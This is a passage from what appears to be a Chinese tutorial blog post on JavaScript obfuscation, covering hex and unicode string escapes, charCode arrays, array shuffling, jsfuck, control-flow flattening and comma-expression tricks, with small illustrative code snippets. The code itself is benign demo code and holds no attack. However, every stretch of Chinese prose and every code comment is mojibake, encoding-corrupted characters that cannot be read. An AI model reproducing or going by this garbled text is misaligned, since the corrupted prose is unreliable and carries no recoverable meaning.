å¯†å­—ç¬¦ä¸²æ•°ç»„ï¼Œä¹‹åçš„å­—ç¬¦ä¸²è°ƒç”¨å°†ä»¥è·å–æ•°ç»„çš„å½¢å¼è·å–å­—ç¬¦ä¸²ï¼Œä½†æ˜¯å­—ç¬¦ä¸²ä½ç½®å›ºå®šï¼Œæ‰€ä»¥æ•°ç»„æ··æ·†å’Œæ•°ç»„ä¹±åºé€šå¸¸æ­é…ä½¿ç”¨ã€‚</p><p>æ•°ç»„æ··æ·†çš„ç‰¹å¾æ˜¯ï¼Œæ··æ·†è„šæœ¬å¤´éƒ¨ä¼šå­˜ä¸€ä¸ªè¾ƒé•¿çš„å­—ç¬¦ä¸²åŠ å¯†æ•°ç»„ï¼›æ•°ç»„ä¹±åºçš„ç‰¹å¾æ˜¯ä»£ç ä¸­åŒ…å«pushå’Œshiftå­—ç¬¦ä¸²ï¼Œç”¨äºæ‰“ä¹±æ•°ç»„é¡ºåº</p><h2 id="å­—ç¬¦ä¸²åŠ å¯†">å­—ç¬¦ä¸²åŠ å¯†</h2><p>æ¯”è¾ƒå¸¸ç”¨çš„äº‹base64åŠ å¯†ï¼Œç‰¹å¾æ˜¯è„šæœ¬ä¸­ä¼šå­˜åœ¨atobæ–¹æ³•ï¼Œç”¨äºbase64åŠ å¯†æ–‡æœ¬çš„è§£å¯†ã€‚</p><h2 id="å­—ç¬¦ä¸²èŠ±æŒ‡ä»¤">å­—ç¬¦ä¸²èŠ±æŒ‡ä»¤</h2><p>æ˜¯ä¸€äº›æ— ç”¨çš„ä»£ç ï¼Œä¸»è¦ä¸ºäº†å¢åŠ ç ´è§£éš¾åº¦ï¼Œæœ€å¸¸è§çš„å­—ç¬¦ä¸²èŠ±æŒ‡ä»¤å°±æ˜¯å››åˆ™è¿ç®—çš„æ”¹å†™</p><h2 id="switchæµç¨‹æ§åˆ¶å¹³å¦åŒ–">switchæµç¨‹æ§åˆ¶å¹³å¦åŒ–</h2><p>ä¼šæŠŠåŸå…ˆçš„ä»£ç æ‰§è¡Œé“¾æ‹†åˆ†ä¸ºswitchåˆ¤æ–­çš„å¤šå¾ªç¯ç»“æ„ï¼Œä½œä¸ºswitchæ‰§è¡Œçš„åˆ†å‘å™¨ï¼Œç„¶åå°†åŸæœ¬çš„ä»£ç æ”¹å†™ä¸ºswitchå½¢å¼ï¼ŒæŒ‰ç…§åˆ†å‘å™¨çš„é¡ºåºè¿›è¡Œcaseåˆ¤æ–­ã€‚æœ€æ˜¾è‘—ç‰¹å¾ä¸ºå­˜åœ¨ä¸€ä¸ªå¾ªç¯çš„whileç»“æ„ï¼Œå…¶ä¸­åŒ…å«å¤šä¸ªä»¥æ•°ç»„ä¸ºåˆ¤æ–­æ¡ä»¶çš„caseç»“æ„ï¼Œåœ¨ä»–ä¸Šé¢çš„å˜é‡å£°æ˜ä¸€èˆ¬ä¸ºåˆ†å‘å™¨</p><h1>JSä»£ç å®‰å…¨é˜²æŠ¤åŸç†</h1><h2 id="å¸¸é‡çš„æ··æ·†">å¸¸é‡çš„æ··æ·†</h2><h3 id="å¯¹è±¡å±æ€§çš„ä¸¤ç§è®¿é—®æ–¹å¼">å¯¹è±¡å±æ€§çš„ä¸¤ç§è®¿é—®æ–¹å¼</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">People</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">People</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayHello</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p.<span class="property">name</span>);</span><br><span class="line">p.<span class="title function_">sayHello</span>();</span><br><span class="line"><span class="comment">//ç®€å•æ··æ·†</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">p[<span class="string">&#x27;sayHello&#x27;</span>]();</span><br><span class="line"></span><br><span class="line"><span class="comment">//åœ¨JavaScriptä¸­ï¼Œprototype æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å±æ€§ï¼Œå®ƒä¸æ„é€ å‡½æ•°ï¼ˆconstructorï¼‰å’Œå¯¹è±¡å®ä¾‹ï¼ˆinstancesï¼‰ä¹‹é—´çš„å…³ç³»æœ‰å…³ã€‚è¿™ä¸ªå±æ€§ä¸»è¦ç”¨äºå®ç°ç»§æ‰¿å’Œå…±äº«æ–¹æ³•ã€‚æ¯ä¸ª JavaScript å‡½æ•°éƒ½æœ‰ä¸€ä¸ª prototype å±æ€§ï¼Œå®ƒæ˜¯ä¸€ä¸ªæŒ‡å‘å¯¹è±¡çš„å¼•ç”¨ã€‚å½“ä½ åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡å®ä¾‹æ—¶ï¼Œè¿™ä¸ªå®ä¾‹ä¼šç»§æ‰¿å…¶æ„é€ å‡½æ•°çš„ prototype å¯¹è±¡ä¸Šçš„å±æ€§å’Œæ–¹æ³•ã€‚</span></span><br></pre></td></tr></table></figure><p>JSä¸­ï¼Œå¾ˆå¤šå†…ç½®å¯¹è±¡éƒ½æ˜¯windowçš„å±æ€§ï¼Œä»£ç ä¸­å®šä¹‰çš„å…¨å±€å˜é‡éƒ½æ˜¯å…¨å±€å¯¹è±¡windowçš„å±æ€§ï¼Œå®šä¹‰çš„å…¨å±€å‡½æ•°éƒ½æ˜¯å…¨å±€å¯¹è±¡windowçš„æ–¹æ³•ï¼Œå…¨å±€å¯¹è±¡çš„å±æ€§æˆ–è€…æ–¹æ³•åœ¨è°ƒç”¨æ—¶å¯ä»¥çœç•¥å…¨å±€å¯¹è±¡åã€‚[]å½¢å¼è°ƒç”¨åˆ™ä¸èƒ½çœç•¥ï¼Œå¦‚</p><p><code>new window.Date() == new Date() == new window['Date']()</code></p><h3 id="åå…­è¿›åˆ¶å­—ç¬¦ä¸²">åå…­è¿›åˆ¶å­—ç¬¦ä¸²</h3><p>å­—ç¬¦ä¸²çš„åå…­è¿›åˆ¶å½¢å¼ä»£æ›¿å­—ç¬¦ä¸²</p><p>å­—ç¬¦å˜ä¸ºå­—èŠ‚å½¢å¼ï¼Œå¦‚â€™yyâ€™-&gt;'\x79\x79â€™å†è½¬åŒ–ä¸ºHexå½¢å¼</p><p>è„šæœ¬å®ç°ä¸Šé¢çš„æ··æ·†</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hexEnc</span>(<span class="params">code</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> hexStr=[],i=<span class="number">0</span>,s;i&lt;code.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        s=code.<span class="title function_">charCodeAt</span>(i).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        hexStr+=<span class="string">&quot;\\x&quot;</span>+s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hexStr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//charAtæ˜¯å–å‡ºå­—ç¬¦ä¸²ä¸­å¯¹åº”ç´¢å¼•çš„å­—ç¬¦ï¼Œè€ŒcharCodeAtç”¨æ¥å–å‡ºå¯¹åº”ç´¢å¼•å­—ç¬¦çš„ASCIIç ï¼Œç„¶åtoString(16)è½¬åŒ–ä¸ºåå…­è¿›åˆ¶</span></span><br></pre></td></tr></table></figure><p><code>var a =&#123;&quot;name&quot; : &quot;zxk1ng&quot;&#125;;</code></p><p>è¿™é‡Œçš„â€nameâ€œä¸èƒ½æ‹¼æ¥ä¸èƒ½åŠ å¯†ï¼Œä½†æ˜¯å¯ä»¥å˜ä¸ºå­—èŠ‚å½¢å¼</p><h3 id="unicode">unicode</h3><p><strong>å¯ä»¥å¯¹å˜é‡å’Œå­—ç¬¦ä¸²è¿›è¡Œunicode</strong></p><p>ä¾‹å­</p><p><code>var Week=['ä¸€','äºŒ']  &lt;==&gt;var Week=['\u4e00','\u4e8c']</code></p><p><code>'Date' &lt;==&gt;</code> â€˜\u0044\u0061\u0074\u0065â€™</p><p>ä»¥ä¸‹ä»£ç å®ç°unicodeè½¬æ¢</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">unicodeEnc</span>(<span class="params">str</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> value=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;str.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        value+=<span class="string">&quot;\\u&quot;</span>+(<span class="string">&quot;0000&quot;</span>+<span class="built_in">parseInt</span>(str.<span class="title function_">charCodeAt</span>(i)).<span class="title function_">toString</span>(<span class="number">16</span>)).<span class="title function_">substr</span>(-<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unicodeå­—ç¬¦ä¸²çš„è¿˜åŸæ–¹æ³•ï¼Œä¸åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸€æ ·ï¼ŒæŠŠå­—ç¬¦ä¸²æ”¾åˆ°æ§åˆ¶å°ä¸­è¾“å‡ºå³å¯</p><h3 id="å­—ç¬¦ä¸²çš„ASCIIç æ··æ·†">å­—ç¬¦ä¸²çš„ASCIIç æ··æ·†</h3><p>ä¸ºäº†å®Œæˆè¿™ä¸ªæ··æ·†éœ€è¦Stringå¯¹è±¡ä¸‹çš„charCodeAtå’ŒfromCharCode(å’ŒcharCodeAtè¿‡ç¨‹ç›¸å)</p><p><code>console.log('b'.charCodeAt(0));</code></p><p><code>console.log(String.fromCharCode(120,12));</code>å¯ä»¥æœ‰å¤šä¸ªå‚æ•°ï¼Œ<strong>è¿”å›å­—ç¬¦ä¸²</strong></p><p>æŠŠä¸€ä¸ªå­—ç¬¦ä¸²è½¬åŒ–ä¸ºå­—èŠ‚æ•°ç»„</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">stringToByte</span>(<span class="params">str</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> byteArr=[];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;str.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        byteArr.<span class="title function_">push</span>(str.<span class="title function_">charCodeAt</span>(i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> byteArr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fromCharCodeæ¥æ”¶çš„å‚æ•°ç±»å‹ä¸æ˜¯æ•°ç»„ï¼Œå¦‚æœæƒ³è¦ä¼ é€’æ•°ç»„ï¼Œå¯ä»¥ä½¿ç”¨String.fromCharCode.apply(null,[102,111,114])ï¼Œapplyæ˜¯å‡½æ•°å¯¹è±¡å°±æœ‰çš„æ–¹æ³•ã€‚</p><p>evalä¸functionå¯ä»¥æŠŠå­—ç¬¦ä¸²å½“åšä»£ç ä½¿ç”¨ï¼Œfunctionç”¨æ¥ç”Ÿæˆä¸€ä¸ªå‡½æ•°ã€‚</p><p>atob() æ–¹æ³•ç”¨äºè§£ç  base-64 ç¼–ç çš„å­—ç¬¦ä¸²ã€‚</p><p>btoa()ç”¨äºç¼–ç base64</p><ul><li>å¦‚æœç”¨base64ç¼–ç åçš„æ–¹æ³•è¦æ­£å¸¸ä½¿ç”¨ï¼Œéœ€è¦atob(â€œxxxâ€)æ‰èƒ½æ­£å¸¸å‘æŒ¥è¿™ä¸ªæ–¹æ³•åŠŸèƒ½ã€‚</li></ul><p><img src="/posts/95017dfa.htm/image-20241113230217551.png" alt="image-20241113230217551"></p><h3 id="æ•°å€¼å¸¸é‡åŠ å¯†">æ•°å€¼å¸¸é‡åŠ å¯†</h3><p>ä¾‹å¦‚md5åŠ å¯†ä¸­çš„å¸¸é‡å€¼ï¼ŒæŠŠä»–å˜åŒ–å°±ä¸æ˜“ç¡®å®šè¿™æ˜¯å“ªä¸ªåŠ å¯†ç®—æ³•æˆ–ä¸å®¹æ˜“æ‰¾åˆ°å…³é”®ä»£ç ã€‚</p><h2 id="å¢åŠ é€†å‘çš„å·¥ä½œé‡">å¢åŠ é€†å‘çš„å·¥ä½œé‡</h2><h3 id="æ•°ç»„æ··æ·†">æ•°ç»„æ··æ·†</h3><p>æ‰€æœ‰å­—ç¬¦ä¸²æå–åˆ°ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œåœ¨å¼•ç”¨å­—ç¬¦ä¸²çš„åœ°æ–¹å…¨éƒ½ä»¥æ•°ç»„ä¸‹æ ‡çš„æ–¹å¼å»è®¿é—®æ•°ç»„æˆå‘˜(æ•°ç»„é‡Œçš„ä¸€èˆ¬ä¼šè¿›è¡ŒåŠ å¯†å˜åŒ–)ï¼Œå¦‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bigArr = [<span class="string">&#x27;Date&#x27;</span>,<span class="string">&#x27;getTime&#x27;</span>,<span class="string">&#x27;log&#x27;</span>];</span><br><span class="line"><span class="variable language_">console</span>[bigArr[<span class="number">2</span>]](<span class="keyword">new</span> <span class="variable language_">window</span>[bigArr[<span class="number">0</span>]]()[bigArr[<span class="number">1</span>]]());</span><br><span class="line"><span class="comment">//console.log(new window.Date().getTime());</span></span><br></pre></td></tr></table></figure><p><strong>åœ¨åˆ«çš„è¯­è¨€ï¼ŒåŒä¸€ä¸ªæ•°ç»„åªèƒ½å­˜æ”¾åŒä¸€ç±»å‹ï¼Œä½†æ˜¯JSå¯ä»¥å­˜æ”¾å¤šä¸ªç±»å‹</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">People</span>(<span class="params"></span>)&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">People</span>.<span class="property">a</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">People</span>();</span><br><span class="line">p.<span class="property">constructor</span>.<span class="title function_">a</span>(); ==&gt;ä¼šè¾“å‡ºhello</span><br><span class="line">p.<span class="property">constructor</span>       ==&gt;è¾“å‡ºæ„é€ å‡½æ•° <span class="keyword">function</span> <span class="title function_">People</span>(<span class="params"></span>)&#123;&#125;</span><br></pre></td></tr></table></figure><p><code>console.log(&quot;&quot;['constructor']['fromCharCode'](120));   è¾“å‡ºx </code>ç›¸å½“äºè°ƒç”¨Stringä¸‹çš„fromCharCodeæ–¹æ³•ã€‚æœ€å‰é¢å¯ä»¥æ˜¯ä»»æ„çš„å­—ç¬¦ä¸²å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥æ˜¯ç©ºå­—ç¬¦ä¸²ï¼Œconstructorä»£è¡¨è·å–æ„é€ å‡½æ•°ï¼Œå› æ­¤<code>&quot;&quot;['constructor']</code>ç­‰åŒäºString</p><h3 id="æ•°ç»„ä¹±åº">æ•°ç»„ä¹±åº</h3><p>æŠŠæ•°ç»„æˆå‘˜æ‰“ä¹±é¡ºåºï¼Œç„¶ååœ¨ç´¢å¼•æˆå‘˜ä¹‹å‰å†æŠŠæ•°ç»„æ¢å¤åŸæ¥çš„é¡ºåº</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ•°ç»„æ‰“ä¹±</span></span><br><span class="line"><span class="keyword">var</span> bigArr=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>];</span><br><span class="line">(<span class="keyword">function</span>(<span class="params">arr,num</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> shuffer=<span class="keyword">function</span>(<span class="params">nums</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(--nums)&#123;</span><br><span class="line">            arr.<span class="title function_">unshift</span>(arr.<span class="title function_">pop</span>()); <span class="comment">//æœ€åæˆå‘˜æ”¾åœ¨å¼€å¤´</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">shuffer</span>(++num);</span><br><span class="line">&#125;(bigArr,<span class="number">0x20</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bigArr);</span><br></pre></td></tr></table></figure><p>æ•°ç»„æ¢å¤</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ•°ç»„æ‰“ä¹±</span></span><br><span class="line"><span class="keyword">var</span> bigArr=[å¡«å…¥æ‰“ä¹±åçš„æ•°ç»„é¡ºåº];</span><br><span class="line">(<span class="keyword">function</span>(<span class="params">arr,num</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> shuffer=<span class="keyword">function</span>(<span class="params">nums</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(--nums)&#123;</span><br><span class="line">            arr[<span class="string">&#x27;push&#x27;</span>](arr[<span class="string">&#x27;shift&#x27;</span>]());<span class="comment">//ç¬¬ä¸€ä¸ªæˆå‘˜æ”¾åœ¨æœ€å</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">shuffer</span>(++num);</span><br><span class="line">&#125;(bigArr,<span class="number">0x20</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bigArr);</span><br></pre></td></tr></table></figure><h3 id="èŠ±æŒ‡ä»¤">èŠ±æŒ‡ä»¤</h3><p>æ·»åŠ ä¸€äº›æ²¡æœ‰æ„ä¹‰å´å¯ä»¥æ··æ·†è§†å¬çš„ä»£ç ï¼Œæ˜¯èŠ±æŒ‡ä»¤çš„æ ¸å¿ƒ</p><h3 id="jsfuck">jsfuck</h3><p>jsfuckä¹Ÿæ˜¯ä¸€ç§ç¼–ç ï¼ŒæŠŠjsä»£ç è½¬åŒ–ä¸ºåªç”¨6ä¸ªå­—ç¬¦å°±å¯ä»¥è¡¨ç¤ºçš„ä»£ç ã€‚æ¯”å¦‚å¸¸é‡8è½¬åŒ–ä¸ºjsfuckä¸ºï¼š</p><p><code>(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])</code></p><p>åŸºæœ¬åŸç†ï¼š</p><p>+å·æ˜¯jsä¸€ä¸ªè¿ç®—ç¬¦ï¼Œå½“ä»–ä½œä¸ºä¸€å…ƒè¿ç®—ç¬¦ä½¿ç”¨ï¼Œä»£è¡¨å¼ºè½¬ä¸ºæ•°å€¼å‹ã€‚[]æ˜¯ç©ºæ•°ç»„æ‰€ä»¥+[]ç­‰äº0ï¼Œ!+[]ç­‰åŒäº!0ï¼Œjsæ˜¯ä¸€ç§å¼±ç±»å‹è¯­è¨€ï¼Œjså¼•æ“ä¼šåœ¨é€‚å½“æ—¶å€™ï¼Œè‡ªåŠ¨å®Œæˆç±»å‹éšå¼è½¬åŒ–ã€‚!æ˜¯jsçš„å–åï¼Œä¹Ÿå°±æ˜¯è¿™æ—¶å€™éœ€è¦ä¸€ä¸ªå¸ƒå°”å€¼ã€‚ï¼ˆjsä¸­7ç§å€¼ä¸ºå‡å€¼ï¼šfalse,undefuned,null,0,-0,NaN,â€œâ€ï¼Œå…¶ä»–éƒ½æ˜¯çœŸï¼‰ï¼Œå› æ­¤!0æ˜¯trueï¼Œ!![]ä¸¤æ¬¡å–åè¿˜æ˜¯çœŸã€‚</p><p>+å·ä½œä¸ºäºŒå…ƒè¿ç®—ç¬¦çš„æ—¶å€™ï¼ŒåŠ å…¥ä¸€è¾¹æœ‰å­—ç¬¦ä¸²è¡¨ç¤ºæ‹¼æ¥ã€‚å¦‚æœä¸¤è¾¹éƒ½æ²¡æœ‰è¡¨ç¤ºæ•°å€¼ç›¸åŠ ã€‚</p><p>å®é™…å¼€å‘ä¸­ï¼Œjsfuckåº”ç”¨æœ‰é™ï¼Œåªä¼šåº”ç”¨äºjsä¸­çš„ä¸€éƒ¨åˆ†ä»£ç ï¼Œä¸»è¦ç”±äºè¿˜åŸç®€å•ï¼Œç›´æ¥åœ¨æ§åˆ¶å°è¾“å…¥å³å¯è¾“å‡ºç»“æœã€‚</p><h2 id="ä»£ç æ‰§è¡Œæµç¨‹é˜²æŠ¤åŸç†">ä»£ç æ‰§è¡Œæµç¨‹é˜²æŠ¤åŸç†</h2><h3 id="æµç¨‹å¹³å¦åŒ–">æµç¨‹å¹³å¦åŒ–</h3><p>é€šè¿‡switchâ€¦caseè¯­å¥æ”¹å˜åŸæ¥çš„æµç¨‹</p><h3 id="é€—å·è¡¨è¾¾å¼æ··æ·†">é€—å·è¡¨è¾¾å¼æ··æ·†</h3><p>æŠŠå¤šä¸ªè¡¨è¾¾å¼æˆ–è¯­å¥è¿æ¥æˆä¸€ä¸ªå¤åˆè¯­å¥ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a=<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">var</span> b=a+<span class="number">2000</span>;   </span><br><span class="line">    <span class="keyword">var</span> c=b+<span class="number">3000</span>;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€—å·è¡¨è¾¾å¼</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a,b,c;</span><br><span class="line">    <span class="keyword">return</span> a=<span class="number">1000</span>,</span><br><span class="line">    b=a+<span class="number">2000</span>,</span><br><span class="line">    c=b+<span class="number">3000</span>,</span><br><span class="line">    c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//returnè¯­å¥åé€šå¸¸åªèƒ½è·Ÿä¸€ä¸ªè¡¨è¾¾å¼ï¼Œä»–ä¼šè¿”å›è¿™ä¸ªè¡¨è¾¾å¼çš„ç»“æœï¼Œä½†æ˜¯é€—å·è¿ç®—ç¬¦å¯ä»¥æŠŠå¤šä¸ªè¡¨è¾¾å¼è¿æ¥æˆä¸€ä¸ªå¤åˆè¯­å¥ã€‚æ‰€ä»¥ä¸Šè¿°ä»£ç ä¼šè¿”å›æœ€åä¸€ä¸ªè¡¨è¾¾å¼è®¡ç®—åçš„ç»“æœï¼Œä½†æ˜¯å‰é¢çš„è¡¨è¾¾å¼ä¾ç„¶ä¼šæ‰§è¡Œï¼Œ</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=(a=<span class="number">1000</span>,a+=<span class="number">2000</span>) ==&gt;<span class="number">3000</span><span class="string">``</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¬¬ä¸€è¡Œæ‹¬å·ä»£è¡¨æ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œä¹Ÿå°±æ˜¯æŠŠæ•´ä½“èµ‹å€¼ç»™aï¼Œä¼šå…ˆæ‰§è¡Œa=1000,å†</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">a,b,c</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> c=(b=(a=<span class="number">1000</span>,a+<span class="number">2000</span>),b+<span class="number">3000</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€—å·è¡¨è¾¾å¼æ··æ·†ä¸ä»…èƒ½å¤„ç†èµ‹å€¼è¡¨è¾¾å¼ï¼Œè¿˜èƒ½å¤„ç†è°ƒç”¨è¡¨è¾¾å¼ï¼Œæˆå‘˜è¡¨è¾¾å¼ï¼Œå¦‚ä¸‹æ¡ˆä¾‹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">    <span class="attr">add</span>:<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sub</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a=<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">var</span> b=<span class="title function_">sub</span>(a,<span class="number">3000</span>)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">var</span> c=b+obj.<span class="title function_">add</span>(b,<span class="number">2000</span>);</span><br><span class="line">    <span class="keyword">return</span> c+obj.<span class="property">name</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>testå‡½æ•°ä¸­æœ‰å‡½æ•°è°ƒç”¨è¡¨è¾¾å¼ï¼Œè¿˜æœ‰æˆå‘˜è¡¨è¾¾å¼ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢ä¸¤ä¸ªæ–¹æ³•è¿›è¡Œå¤„ç†ï¼š</p><ul><li>æå‡å˜é‡å£°æ˜åˆ°å‚æ•°ä¸­</li><li><code>b=(a=1000,sub)(a,3000)+1</code>ä¸­çš„<code>(a=1000,sub)</code>å¯ä»¥æ•´ä½“è¿”å›subå‡½æ•°ï¼Œç„¶åç›´æ¥è°ƒç”¨ï¼Œæœ€ååŠ 